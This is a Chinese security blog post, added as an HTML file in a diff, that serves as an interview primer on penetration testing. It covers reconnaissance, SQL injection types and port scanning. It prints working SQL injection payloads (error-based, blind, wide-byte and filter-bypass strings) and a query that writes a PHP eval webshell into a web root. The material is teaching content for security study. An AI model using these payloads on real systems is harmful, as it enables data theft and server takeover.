@@ -1,0 +1,1312 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=dark>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/image/atom1.png">
+  <link rel="icon" href="/image/atom1.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#153b6e">
+  <meta name="author" content="郭佳明">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="渗透测试流程 信息收集：收集目标站点的相关信息，包括IP地址、子域名、C段、旁站、框架、服务器系统、语言、目录结构、数据库类型、端口、注册人员信息以及防护设备等数据。 漏洞发现：通过对目标站点进行功能点测试（上传、越权、目录遍历、注入、XSS、CSRF等）、利用漏扫工具（如Nessus、AWVS）和手工测试系统漏洞等手段，来发现可能存在的漏洞。 漏洞验证：使用Kali等黑客工具，利用已经发现的漏洞">
+<meta property="og:type" content="article">
+<meta property="og:title" content="hvv面试知识点扫盲">
+<meta property="og:url" content="http://gls.show/p/e32f19d0/index.html">
+<meta property="og:site_name" content="郭佳明的博客">
+<meta property="og:description" content="渗透测试流程 信息收集：收集目标站点的相关信息，包括IP地址、子域名、C段、旁站、框架、服务器系统、语言、目录结构、数据库类型、端口、注册人员信息以及防护设备等数据。 漏洞发现：通过对目标站点进行功能点测试（上传、越权、目录遍历、注入、XSS、CSRF等）、利用漏扫工具（如Nessus、AWVS）和手工测试系统漏洞等手段，来发现可能存在的漏洞。 漏洞验证：使用Kali等黑客工具，利用已经发现的漏洞">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://gls.show/image/default.png">
+<meta property="article:published_time" content="2023-07-26T02:09:09.983Z">
+<meta property="article:modified_time" content="2023-09-01T03:01:09.148Z">
+<meta property="article:author" content="郭佳明">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://gls.show/image/default.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>hvv面试知识点扫盲 - 郭佳明的博客</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"gls.show","root":"/","version":"1.9.0","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+
+  
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>郭佳明的博客</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/image/mountain1.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="hvv面试知识点扫盲"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-07-26 10:09" pubdate>
+          2023年7月26日 上午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          <!-- compatible with older versions-->
+          21k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          <!-- compatible with older versions-->
+          67 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">hvv面试知识点扫盲</h1>
+            
+              <p class="note note-info">
+                
+                  
+                    <!-- compatible with older versions-->
+                    本文最后更新于：2023年9月1日 上午
+                  
+                
+              </p>
+            
+            <div class="markdown-body">
+              
+              <h1 id="渗透测试流程"><a href="#渗透测试流程" class="headerlink" title="渗透测试流程"></a>渗透测试流程</h1><ol>
+<li>信息收集：收集目标站点的相关信息，包括IP地址、子域名、C段、旁站、框架、服务器系统、语言、目录结构、数据库类型、端口、注册人员信息以及防护设备等数据。</li>
+<li>漏洞发现：通过对目标站点进行功能点测试（上传、越权、目录遍历、注入、XSS、CSRF等）、利用漏扫工具（如Nessus、AWVS）和手工测试系统漏洞等手段，来发现可能存在的漏洞。</li>
+<li>漏洞验证：使用Kali等黑客工具，利用已经发现的漏洞进行手工验证，以确认漏洞是否仍然存在以及漏洞的危害程度。</li>
+<li>出具报告交付：在完成漏洞验证后，根据渗透测试的结果和严重程度，出具详细的安全漏洞报告，描述发现的漏洞包括可能的危害程度、访问路径、确认过程以及建议修复措施等项信息，以交付于委托者。</li>
+<li>漏洞复测：对修复后的漏洞再次进行测试，以确认修复情况。</li>
+</ol>
+<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><blockquote>
+<p>如何信息收集（IP、子域名、C段、旁站、框架、服务器系统、语言、目录结构、数据库类型、端口、注册人员信息、防护设备</p>
+</blockquote>
+<ol>
+<li>Whois 查询：WHOIS查询是一种用于查找域名、IP地址以及域名注册人信息的网络协议。可以通过WHOIS查询获取到域名注册人的联系信息、DNS服务器、域名过期时间等信息。</li>
+<li>子域名枚举：使用子域名爆破工具（如 subdomain-find），枚举出目标系统的子域名（例如blog.example.com、mail.example.com等）以及与目标公司有关系的其他域名。</li>
+<li>C段扫描：对IP地址所处的C段内的所有主机进行扫描，了解其他潜在的服务器或者系统。<ol>
+<li>C段扫描通常是指对目标 IP 地址所在的整个 C 类网络地址段进行扫描的过程，发现同一网络内的其他主机信息。例如，如果目标 IP 地址是 192.168.1.100，那么其所在的 C 类网络地址段是 192.168.1.0/24，C段扫描就是在该网络段内对主机进行端口扫描、服务探测等安全测试。</li>
+<li>C段扫描通常是渗透测试的一部分，用于发现与目标位于同一网络段内的其他主机信息，从而帮助测试人员 identifly 安全风险和弱点。</li>
+</ol>
+</li>
+<li>旁站探测：通过旁站分析工具（例如webby、bebop等），查找与目标系统相关的其他网站。</li>
+<li>框架识别：识别目标网站所使用的 CMS 系统和框架，例如 WordPress、Joomla、Drupal 等，从而了解可能存在的安全漏洞。<ol>
+<li>WordPress、Joomla 等 CMS 系统通常在 head 标签中添加 generator 标记；</li>
+<li>Bootstrap、jQuery 等常用的前端库和框架也常常在代码中添加版本信息和其他特定标识。</li>
+</ol>
+</li>
+<li>服务器识别：使用工具（如 Nmap 等）对目标主机进行端口扫描，从而发现系统中的运行服务、操作系统以及端口信息。</li>
+<li>语言版本识别：使用工具（如 Wappalyzer 等）识别网站所使用的语言版本（如 PHP、ASP.NET、Java 等），以便了解成功攻击网站的可能性。</li>
+<li>目录结构探测：使用目录扫描工具（如 DirBuster、Gobuster 等）扫描目标主机的目录结构，发现可能存在的敏感目录以及可能存在的漏洞点。</li>
+<li>数据库类型探测：通过分析页面返回的错误信息和 HTTP 头信息，识别目标系统所使用的数据库类型。<ol>
+<li>端口扫描：通过扫描目标主机上开放的端口，可以映射不同的端口和服务类型，推断出目标数据库所使用的类型（比如mysql是3306）。</li>
+</ol>
+</li>
+<li>端口识别：使用端口扫描工具对目标主机进行扫描，识别主机所开放的端口信息，以便了解目标系统可能存在的漏洞点。<ol>
+<li>nc -vz <a href="www.baidu.com">www.baidu.com</a> 80</li>
+</ol>
+</li>
+<li>注册人员信息收集：查询目标公司注册的信息，例如域名注册人信息、ICP备案信息，从中考察相关人员的联系方式等。</li>
+<li>防护设备识别：通过各种手段收集目标系统接入的安全设备信息，包括防火墙、WAF（Web 应用程序防火墙）等，以便于绕过其保护机制，实现更高效的渗透攻击。</li>
+</ol>
+<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><h2 id="基本技巧"><a href="#基本技巧" class="headerlink" title="基本技巧"></a>基本技巧</h2><ul>
+<li>猜列数：order by 1 表示按照第一列排序，这样可以猜测列有几个列。<ul>
+<li>假设<code>order by 3#</code>时，返回错误那么说明只有两列</li>
+</ul>
+</li>
+<li>猜数据库名称长度<ul>
+<li>1’ and length(database())=3 # 若这个错误下面正常那么数据库名称长度为4</li>
+<li>1’ and length(database())=4 #</li>
+</ul>
+</li>
+<li>联合查询<ul>
+<li>使用 union 查询的时候需要和主查询的列数相同</li>
+<li>Select * From 用户表 Where UserName=xxx and Password=xxx or 1=1–</li>
+</ul>
+</li>
+<li>如果是数字型的注入，那么就不用去闭合单引号</li>
+</ul>
+<h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><p>根据提交方式、注入点和运行结果的不同，SQL注入可以分为以下几种类型：</p>
+<ol>
+<li>GET型注入：通过修改HTTP请求中的URL参数来实现注入攻击，例如：<a target="_blank" rel="noopener" href="http://example.com/?id=1&#39;">http://example.com/?id=1&#39;</a> or 1=1#。</li>
+<li>POST型注入：通过修改HTTP请求体中的表单数据来实现注入攻击，例如：POST /login HTTP/1.1，数据体为：username=admin&amp;password=123’ or 1=1#。</li>
+<li>Cookie型注入：通过修改浏览器的Cookie值来实现注入攻击，例如：Cookie: username=admin; password=123’ or 1=1#。</li>
+</ol>
+<ol>
+<li>数字型注入：针对数字类型的注入点进行攻击，例如：SELECT * FROM users WHERE id=1，攻击者可通过修改id=1为id=1 or 1=1来实现注入攻击。</li>
+<li>字符串型注入：针对字符串类型的注入点进行攻击，例如：SELECT * FROM users WHERE name=’Tom’，攻击者可通过修改name=’Tom’为name=’Tom’ or ‘1’=’1来实现注入攻击。</li>
+</ol>
+<ol>
+<li>搜索型注入：针对搜索功能进行攻击，例如：SELECT * FROM products WHERE name LIKE ‘%apple%’，攻击者可通过搜索框输入%apple%’ or 1=1#来实现注入攻击。</li>
+<li>基于时间的盲注：攻击者无法直接获取注入结果，但是可以通过延长SQL查询时间来判断是否成功注入。</li>
+<li>基于报错的注入：攻击者可以通过构造恶意SQL语句，触发服务器的报错信息，从而获取敏感数据。</li>
+<li>基于布尔的盲注：攻击者无法直接获取注入结果，但是可以通过构造恶意SQL语句，根据返回结果的真假值来推断是否成功注入。</li>
+<li>基于数字的注入：攻击者可以通过构造恶意SQL语句，将注入结果转化为数字输出，例如计算该表中的行数、求和等操作。</li>
+</ol>
+<h2 id="基于报错的注入"><a href="#基于报错的注入" class="headerlink" title="基于报错的注入"></a>基于报错的注入</h2><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs haxe">updatexml（XML_document，XPath_string，<span class="hljs-keyword">new</span><span class="hljs-type">_value</span>）<br>第一个参数：<span class="hljs-keyword">String</span>格式，为XML文档对象的名称<br>第二个参数：Xpath格式的字符串)<br>第三个参数：<span class="hljs-keyword">String</span>格式，替换查找到的符合条件的数据<br><br>作用：改变文档中符合条件的节点的值<br></code></pre></td></tr></table></figure>
+
+<p>注入示例：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>&#x27; and updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e,database(),<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e,user(),<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e,@@datadir),<span class="hljs-number">1</span>)#<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>concat(0x7e,database(),0x7e,user(),0x7e,@@datadir)中间是注入的字符串，这里会爆出数据库、用户信息、目录</li>
+<li>0x7e 是一个十六进制数，表示波浪号字符 “~”，用于分隔要注入的数据。不属于xpath语法格式，因此<strong>报出xpath语法错误</strong></li>
+</ul>
+<h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><blockquote>
+<p>SQL 盲注是在SQL注入攻击过程中，服务器关闭了错误回显，我们单纯通过服务器返回内容的变化来判断是否存在SQL注入和利用的方式</p>
+<p>盲注的手段有两种，一个是通过页面的返回内容是否正确(boolean-based)，来验证是否存在注入。一个是通过sql语句处理时间的不同来判断是否存在注入(time-based)，在这里，可以用benchmark，sleep等造成延时效果的函数</p>
+</blockquote>
+<p>盲注攻击攻击者无法从应用程序的响应中直接获取有关数据库结构、表名、列名和数据等敏感信息。应用程序仅仅返回<code>True</code>（页面）和<code>False</code>（页面）。 这时，我们无法根据应用程序的返回页面得到我们需要的数据库信息，但是可以通过构造逻辑判断（比较大小）来得到我们需要的信息。</p>
+<p>攻击者可以在应用程序的输入字段中注入嵌套的查询命令或者延迟函数，例如 <code>SELECT SLEEP(5)</code>，并通过分析应用程序的响应时间来推导出查询结果，从而了解数据库的信息。</p>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> username = <span class="hljs-string">&#x27;admin&#x27;</span> <span class="hljs-keyword">AND</span> <span class="hljs-keyword">password</span> <span class="hljs-keyword">LIKE</span> <span class="hljs-string">&#x27;a%&#x27;</span>;<br></code></pre></td></tr></table></figure>
+
+<p>如果该查询返回结果，则认证系统将用户“admin”的密码设置为以“a”开头的字符串。攻击者利用这一点可以通过逐一枚举判断密码的每个字符来猜测密码。例如，攻击者可以进行以下尝试：</p>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> username = <span class="hljs-string">&#x27;admin&#x27;</span> <span class="hljs-keyword">AND</span> <span class="hljs-keyword">password</span> <span class="hljs-keyword">LIKE</span> <span class="hljs-string">&#x27;a%&#x27;</span>;<br><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> username = <span class="hljs-string">&#x27;admin&#x27;</span> <span class="hljs-keyword">AND</span> <span class="hljs-keyword">password</span> <span class="hljs-keyword">LIKE</span> <span class="hljs-string">&#x27;b%&#x27;</span>;<br><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> username = <span class="hljs-string">&#x27;admin&#x27;</span> <span class="hljs-keyword">AND</span> <span class="hljs-keyword">password</span> <span class="hljs-keyword">LIKE</span> <span class="hljs-string">&#x27;c%&#x27;</span>;<br>...<br></code></pre></td></tr></table></figure>
+
+<p>如果查询返回结果，则意味着该字符串以该字符开头</p>
+<h3 id="计时攻击（Time-based-Attack）实现盲注"><a href="#计时攻击（Time-based-Attack）实现盲注" class="headerlink" title="计时攻击（Time-based Attack）实现盲注"></a>计时攻击（Time-based Attack）实现盲注</h3><p>假设目标网站有一个登录表单，用户名和密码将被发送到服务器进行验证。攻击者想要使用注入攻击尝试获取管理员账户的密码，攻击者可以像下面这样构造一个 SQL 查询：</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> username=<span class="hljs-string">&#x27;admin&#x27;</span> <span class="hljs-keyword">AND</span> <span class="hljs-keyword">password</span> <span class="hljs-keyword">LIKE</span> <span class="hljs-string">&#x27;a%&#x27;</span> <span class="hljs-keyword">AND</span> sleep(<span class="hljs-number">10</span>)<span class="hljs-comment">--&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<p>在上面的查询中， <code>--&#39;</code> 是注释，它会注销掉查询中的剩余部分，以避免任何其他查询参数引起的错误。查询的 SLEEP() 函数将延迟响应时间，如果结果得到了返回，那么在查询返回之前将会等待10秒钟，那么攻击者就可以推断这个查询是正确的，这意味着在密码字段中的第一个字符是 ‘a’。通过重复这个过程，攻击者可以尝试逐渐猜测密码中的每一个字符，最终获得管理员账户的密码。</p>
+<p><code>benchmark</code> 命令来测试数据库的响应时间，以确定注入语句的有效性和可行性。例如，在 SQL 注入攻击中，攻击者可能会构造一个包含 <code>benchmark</code> 命令的注入语句，例如：</p>
+<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp">SELECT benchmark(<span class="hljs-number">1000000</span>, MD5(&#x27;a&#x27;))<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>
+
+<p>上述语句将执行 100 万次 MD5 加密操作</p>
+<p>⼆分法逐字猜解：</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">猜解数据库第一个字符为：d<br><span class="hljs-number">1</span><span class="hljs-string">&#x27; and ascii(substr(database(),1,1))=100 #</span><br><span class="hljs-string">猜解数据库第二个字符为：v</span><br><span class="hljs-string">1&#x27;</span> <span class="hljs-keyword">and</span> ascii(substr(<span class="hljs-keyword">database</span>(),<span class="hljs-number">2</span>,<span class="hljs-number">1</span>))=<span class="hljs-number">118</span> #<br>猜解数据库第三个字符为：w<br><span class="hljs-number">1</span><span class="hljs-string">&#x27; and ascii(substr(database(),3,1))=119 #</span><br><span class="hljs-string">猜解数据库第三个字符为：a</span><br><span class="hljs-string">1&#x27;</span> <span class="hljs-keyword">and</span> ascii(substr(<span class="hljs-keyword">database</span>(),<span class="hljs-number">4</span>,<span class="hljs-number">1</span>))=<span class="hljs-number">97</span> #<br><br>注释：<br>substr（str,<span class="hljs-keyword">start</span>,stop）<br>substr截取字符串str,从<span class="hljs-keyword">start</span>开始截取，截取stop个字符<br></code></pre></td></tr></table></figure>
+
+<h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><p>有时候<code>&#39;</code>会被替换为<code>\&#39;</code>以防止我们构造<code>&#39;</code>闭合，从而防止注入</p>
+<p>宽字节注入的意思是，利用GBK编码是宽字节（两个字节构成一个汉字）的特点，绕过<code>\&#39;</code></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-operator">%</span>df<span class="hljs-string">&#x27; and 1=1--+</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">%df&#x27;</span><span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span><span class="hljs-operator">%</span>df\<span class="hljs-string">&#x27;（单引号会被加上转义字符\）</span><br><span class="hljs-string"></span><br><span class="hljs-string">%df\&#x27;</span><span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span><span class="hljs-operator">%</span>df<span class="hljs-operator">%</span><span class="hljs-number">5</span>c<span class="hljs-string">&#x27;（\的十六进制为%5c）</span><br><span class="hljs-string"></span><br><span class="hljs-string">%df%5c&#x27;</span><span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span>縗<span class="hljs-string">&#x27;（GBK编码时会认为这时一个宽字节）</span><br></code></pre></td></tr></table></figure>
+
+
+
+<p>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_18980147/article/details/127502369">https://blog.csdn.net/qq_18980147/article/details/127502369</a></p>
+<h2 id="注入的绕过技巧"><a href="#注入的绕过技巧" class="headerlink" title="注入的绕过技巧"></a>注入的绕过技巧</h2><p>绕过空格</p>
+<ul>
+<li>注释替换空格/**/</li>
+<li>两个空格代替一个空格，用Tab代替空格，%a0=空格</li>
+<li>括号绕过空格：在MySQL中，括号是用来包围子查询的。因此，任何可以计算出结果的语句，都可以用括号包围起来。例如：<code>select(user())from dual where(1=1)and(2=2)</code>、<code>?id=1%27and(sleep(ascii(mid(database()from(1)for(1)))=109))%23</code></li>
+</ul>
+<p>引号绕过</p>
+<ul>
+<li>将字符替换为十六进制字符串</li>
+</ul>
+<p>双写绕过</p>
+<ul>
+<li>若只过滤1次，则可以双写绕过（写两次则留下一次）</li>
+</ul>
+<p>等号替换为like</p>
+<p>order by替换为into</p>
+<p>and、or、xor</p>
+<ul>
+<li>and 等于&amp;&amp;、or 等于 ||、not 等于 !、xor 等于|</li>
+</ul>
+<p>逗号绕过</p>
+<ul>
+<li>substr(database(),1,1)—&gt; substr(database() from 1 for 1)</li>
+</ul>
+<p>url编码进行绕过</p>
+<ul>
+<li>除了常见的空格字符（%20）外，其他字符也可以用于混淆，如非断行空格（%a0）、制表符（%09）、换行符（%0a）、回车符（%0d）、垂直制表符（%0b）和加号（+）</li>
+</ul>
+<h2 id="sqlmap-–os-shell原理"><a href="#sqlmap-–os-shell原理" class="headerlink" title="sqlmap –os-shell原理"></a>sqlmap –os-shell原理</h2><p>本质上上传了两个PHP文件，其中一个给我们提供了文件上传的页面，可以通过这个上传页面上传脚本文件到当前目录下。 另外一个则是返回了可以让我们执行系统命令的命令行，命令行也可以在网页url中通过对cmd参数传参执行系统命令</p>
+<h2 id="MySQL写webshell的条件"><a href="#MySQL写webshell的条件" class="headerlink" title="MySQL写webshell的条件"></a>MySQL写webshell的条件</h2><blockquote>
+<p>webshell是一种可以控制和操作网站的恶意代码，通常是一句话木马或者其他脚本语言编写的文件。如果网站存在SQL注入漏洞，攻击者可以利用MySQL数据库的一些特性和函数，将webshell写入到网站的可访问目录中，然后通过客户端工具（如中国菜刀）来连接和执行webshel</p>
+</blockquote>
+<p>MySQL数据库写入webshell的方法:</p>
+<ul>
+<li>使用outfile方法：这是一种MySQL提供的用来写入文件的函数，可以将查询结果或者指定的字符串写入到指定的路径中<code>union select 1,2,3,4,&#39;&lt;?php @eval($_POST[pass]);?&gt;&#39; into outfile &#39;C:/wamp64/www/work/webshell.php&#39;</code></li>
+</ul>
+<h2 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h2><ul>
+<li>数据泄露</li>
+<li>网页篡改</li>
+<li>获取服务器权限（写webshell）</li>
+</ul>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1632161">MySQL手注之布尔型盲注详解 - 腾讯云开发者社区-腾讯云</a></li>
+</ul>
+<h1 id="端口收集"><a href="#端口收集" class="headerlink" title="端口收集"></a>端口收集</h1><p>常用的端口扫描和收集工具：</p>
+<ol>
+<li>Nmap：是一个强大的网络端口扫描工具，可以通过各种扫描技术来检测网络上所有活跃的主机和开放的端口，支持多种操作系统。</li>
+<li>Masscan：是一种快速的端口扫描工具，可以在几分钟内在大规模网络中发现并获取所有开放的TCP/UDP端口。</li>
+<li>Zmap：是一个用于快速扫描IPv4网络的开源工具，可以高效地发现并收集目标网络上开放的端口、地址和服务等信息。</li>
+<li>Unicornscan：是一种快速、高度可定制的端口扫描和信息搜集工具，可在较短的时间内检测出目标网络开放的端口和服务。</li>
+<li>Netcat：是一个类Unix平台上的网络通信工具，在渗透测试中可以用于探测目标IP和端口的开放情况，还可以进行端口扫描和漏洞测试等。</li>
+</ol>
+<p>常见高危端口包括：</p>
+<ol>
+<li>21端口：FTP（File Transfer Protocol）服务端口，存在强制入侵、文件注入、文件泄露的风险。</li>
+<li>22端口：SSH（Secure Shell）服务端口，存在强制入侵、提权、木马、远程执行代码的风险。</li>
+<li>23端口：Telnet服务端口，存在强制入侵、远程执行代码、敏感信息泄露的风险。</li>
+<li>80端口：HTTP（Hyper Text Transfer Protocol）服务端口，存在信息泄露、跨站脚本攻击、SQL注入等风险。</li>
+<li>139/445端口：SMB（Server Message Block）服务端口，存在强制入侵、提权、远程执行代码、敏感信息泄露的风险。</li>
+<li>1433端口：SQL Server数据库服务端口，存在SQL注入、提权、远程执行代码、数据泄露等风险。</li>
+<li>3306端口：MySQL数据库服务端口，存在SQL注入、提权、远程执行代码等风险。</li>
+</ol>
